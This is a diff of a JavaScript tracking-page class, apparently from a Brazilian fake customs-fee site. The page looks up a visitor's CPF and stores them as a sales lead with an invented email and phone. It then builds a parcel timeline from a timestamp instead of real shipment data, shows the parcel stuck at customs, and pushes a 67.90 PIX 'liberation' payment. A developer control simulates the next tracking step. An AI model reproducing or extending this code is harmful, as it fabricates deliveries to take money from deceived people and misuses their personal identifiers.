@@ -6,6 +6,8 @@ import { DataService } from '../utils/data-service.js';
 import { TrackingGenerator } from '../utils/tracking-generator.js';
 import { UIHelpers } from '../utils/ui-helpers.js';
 import { ZentraPayService } from '../services/zentra-pay.js';
+import { RealTimeTrackingSystem } from '../utils/real-time-tracking.js';
+import { DatabaseService } from '../services/database.js';
 
 export class TrackingSystem {
     constructor() {
@@ -14,10 +16,14 @@ export class TrackingSystem {
         this.userData = null;
         this.dataService = new DataService();
         this.zentraPayService = new ZentraPayService();
+        this.realTimeTracking = new RealTimeTrackingSystem();
+        this.dbService = new DatabaseService();
         this.isInitialized = false;
         this.pixData = null;
         this.paymentErrorShown = false;
         this.paymentRetryCount = 0;
+        this.leadData = null;
+        this.timelineUpdateInterval = null;
         
         console.log('TrackingSystem inicializado com Zentra Pay oficial');
         this.initWhenReady();
@@ -328,14 +334,17 @@ export class TrackingSystem {
                 this.currentCPF = cleanCPF;
                 this.userData = cpfData.DADOS;
                 
+                // Buscar ou criar lead no banco de dados
+                await this.handleLeadData(cleanCPF, cpfData.DADOS);
+                
                 UIHelpers.closeLoadingNotification();
                 
                 setTimeout(() => {
                     console.log('Exibindo resultados...');
                     this.displayOrderDetails();
-                    this.generateTrackingData();
+                    this.generateRealTimeTrackingData();
                     this.displayTrackingResults();
-                    this.saveTrackingData();
+                    this.startTimelineUpdates();
                     
                     // Scroll para os resultados
                     const orderDetails = document.getElementById('orderDetails');
@@ -346,6 +355,7 @@ export class TrackingSystem {
                     // Destacar botão de liberação após delay
                     setTimeout(() => {
                         this.highlightLiberationButton();
+                        this.addAdminControls();
                     }, 1500);
                 }, 300);
             } else {
@@ -369,6 +379,43 @@ export class TrackingSystem {
         }
     }
 
+    async handleLeadData(cpf, userData) {
+        try {
+            // Buscar lead existente
+            const existingLead = await this.dbService.getLeadByCPF(cpf);
+            
+            if (existingLead.success && existingLead.data) {
+                console.log('📋 Lead existente encontrado');
+                this.leadData = existingLead.data;
+            } else {
+                console.log('📋 Criando novo lead');
+                // Criar novo lead com timestamp inicial
+                const newLeadData = {
+                    nome_completo: userData.nome,
+                    cpf: cpf,
+                    email: `${userData.nome.toLowerCase().replace(/\s+/g, '.')}@email.com`,
+                    telefone: `(11) 9${cpf.slice(-8)}`,
+                    endereco: 'Endereço não informado',
+                    valor_total: 67.90,
+                    meio_pagamento: 'PIX',
+                    origem: 'direto',
+                    etapa_atual: 1,
+                    status_pagamento: 'pendente',
+                    initial_timestamp: new Date().toISOString(),
+                    produtos: [{ nome: 'Kit 12 caixas organizadoras + brinde', preco: 67.90 }]
+                };
+                
+                const result = await this.dbService.createLead(newLeadData);
+                if (result.success) {
+                    this.leadData = result.data;
+                    console.log('✅ Novo lead criado com sucesso');
+                }
+            }
+        } catch (error) {
+            console.error('❌ Erro ao processar lead:', error);
+        }
+    }
+
     displayOrderDetails() {
         if (!this.userData) return;
         
@@ -386,8 +433,25 @@ export class TrackingSystem {
         this.showElement('trackingResults');
     }
 
-    generateTrackingData() {
-        this.trackingData = TrackingGenerator.generateTrackingData(this.userData);
+    generateRealTimeTrackingData() {
+        const initialTimestamp = this.leadData?.initial_timestamp || new Date().toISOString();
+        console.log('⏰ Gerando timeline baseada em:', initialTimestamp);
+        
+        // Gerar timeline em tempo real
+        const timeline = this.realTimeTracking.generateTimeline(initialTimestamp);
+        
+        this.trackingData = {
+            cpf: this.userData.cpf,
+            currentStep: 'customs',
+            steps: timeline,
+            liberationPaid: this.leadData?.status_pagamento === 'pago' || false,
+            liberationDate: null,
+            deliveryAttempts: 0,
+            lastUpdate: new Date().toISOString(),
+            initialTimestamp: initialTimestamp
+        };
+        
+        console.log('📊 Timeline gerada:', this.trackingData.steps.length, 'etapas');
     }
 
     displayTrackingResults() {
@@ -400,16 +464,67 @@ export class TrackingSystem {
         }, 500);
     }
 
+    startTimelineUpdates() {
+        // Verificar atualizações a cada 30 segundos
+        this.timelineUpdateInterval = setInterval(() => {
+            this.checkForTimelineUpdates();
+        }, 30000);
+        
+        console.log('⏰ Sistema de atualizações em tempo real iniciado');
+    }
+
+    checkForTimelineUpdates() {
+        if (!this.trackingData || !this.trackingData.steps) return;
+        
+        const hasNewSteps = this.realTimeTracking.checkForNewSteps(this.trackingData.steps);
+        
+        if (hasNewSteps) {
+            console.log('🆕 Novas etapas detectadas, atualizando interface');
+            this.updateTimelineDisplay();
+            this.saveTimelineToDatabase();
+        }
+    }
+
+    updateTimelineDisplay() {
+        // Re-renderizar timeline
+        this.renderTimeline();
+        
+        // Animar novas etapas
+        setTimeout(() => {
+            UIHelpers.animateTimeline();
+        }, 100);
+        
+        // Atualizar status
+        this.updateStatus();
+    }
+
+    async saveTimelineToDatabase() {
+        if (this.leadData && this.trackingData) {
+            try {
+                await this.dbService.updateLeadTimeline(this.leadData.cpf, this.trackingData.steps);
+                console.log('💾 Timeline salva no banco de dados');
+            } catch (error) {
+                console.error('❌ Erro ao salvar timeline:', error);
+            }
+        }
+    }
+
     updateStatus() {
         const statusIcon = document.getElementById('statusIcon');
         const currentStatus = document.getElementById('currentStatus');
         
         if (!statusIcon || !currentStatus) return;
         
-        if (this.trackingData.currentStep === 'customs') {
+        const status = this.realTimeTracking.getCurrentStatus(this.trackingData.steps);
+        
+        if (status.includes('alfândega')) {
             statusIcon.innerHTML = '<i class="fas fa-clock"></i>';
             statusIcon.className = 'status-icon in-transit';
-            currentStatus.textContent = 'Aguardando liberação aduaneira';
+            currentStatus.textContent = status;
+        } else {
+            statusIcon.innerHTML = '<i class="fas fa-shipping-fast"></i>';
+            statusIcon.className = 'status-icon in-transit';
+            currentStatus.textContent = status;
         }
     }
 
@@ -450,7 +565,7 @@ export class TrackingSystem {
                     <span class="time">${timeStr}</span>
                 </div>
                 <div class="timeline-text">
-                    <p>${step.isChina ? `<span class="china-tag">[China]</span>` : ''}${step.description}</p>
+                    <p>${step.isChina ? `<span class="china-tag">China</span>` : ''}${step.description}</p>
                     ${buttonHtml}
                 </div>
             </div>
@@ -467,6 +582,71 @@ export class TrackingSystem {
         }
         
         return item;
+    }
+
+    addAdminControls() {
+        // Adicionar controles de admin apenas em desenvolvimento
+        if (window.location.hostname === 'localhost' || window.location.hostname.includes('127.0.0.1')) {
+            const timeline = document.getElementById('trackingTimeline');
+            if (!timeline) return;
+            
+            const adminControls = document.createElement('div');
+            adminControls.className = 'admin-controls';
+            adminControls.style.cssText = `
+                background: #f8f9fa;
+                border: 2px dashed #dee2e6;
+                border-radius: 8px;
+                padding: 15px;
+                margin: 20px 0;
+                text-align: center;
+            `;
+            
+            adminControls.innerHTML = `
+                <p style="margin: 0 0 10px 0; color: #6c757d; font-size: 0.9rem;">
+                    <strong>🔧 Controles de Admin (apenas em desenvolvimento)</strong>
+                </p>
+                <button id="simulateNextStep" class="liberation-button-timeline" style="background: #6c757d; font-size: 0.9rem;">
+                    <i class="fas fa-forward"></i> Simular Próxima Etapa
+                </button>
+            `;
+            
+            timeline.appendChild(adminControls);
+            
+            // Configurar evento do botão
+            const simulateButton = document.getElementById('simulateNextStep');
+            if (simulateButton) {
+                simulateButton.addEventListener('click', () => {
+                    this.simulateNextStep();
+                });
+            }
+        }
+    }
+
+    simulateNextStep() {
+        if (!this.trackingData || !this.trackingData.steps) return;
+        
+        const success = this.realTimeTracking.simulateNextStep(this.trackingData.steps);
+        
+        if (success) {
+            console.log('🔄 Próxima etapa simulada');
+            this.updateTimelineDisplay();
+            this.saveTimelineToDatabase();
+            
+            // Feedback visual
+            const button = document.getElementById('simulateNextStep');
+            if (button) {
+                const originalText = button.innerHTML;
+                button.innerHTML = '<i class="fas fa-check"></i> Simulado!';
+                button.style.background = '#28a745';
+                
+                setTimeout(() => {
+                    button.innerHTML = originalText;
+                    button.style.background = '#6c757d';
+                }, 2000);
+            }
+        } else {
+            console.log('⚠️ Todas as etapas já foram completadas');
+        }
     }
 
     highlightLiberationButton() {
@@ -1058,19 +1238,25 @@ export class TrackingSystem {
                     localStorage.removeItem(key);
                 }
             });
+            
+            // Limpar interval se existir
+            if (this.timelineUpdateInterval) {
+                clearInterval(this.timelineUpdateInterval);
+                this.timelineUpdateInterval = null;
+            }
         } catch (error) {
             console.error('Erro ao limpar dados antigos:', error);
         }
     }
 
-    saveTrackingData() {
-        if (this.currentCPF && this.trackingData) {
-            try {
-                localStorage.setItem(`tracking_${this.currentCPF}`, JSON.stringify(this.trackingData));
-            } catch (error) {
-                console.error('Erro ao salvar dados:', error);
-            }
+    // Limpar recursos ao sair da página
+    cleanup() {
+        if (this.timelineUpdateInterval) {
+            clearInterval(this.timelineUpdateInterval);
+            this.timelineUpdateInterval = null;
         }
+        
+        console.log('🧹 Recursos do sistema de rastreamento limpos');
     }
 
     // Helper methods
@@ -1107,6 +1293,13 @@ export class TrackingSystem {
         return success;
     }
 }
+
+// Limpar recursos quando a página for fechada
+window.addEventListener('beforeunload', () => {
+    if (window.trackingSystemInstance) {
+        window.trackingSystemInstance.cleanup();
+    }
+});
 
 // Expor método global para configurar a API secret
 window.setZentraPayApiSecret = function(apiSecret) {
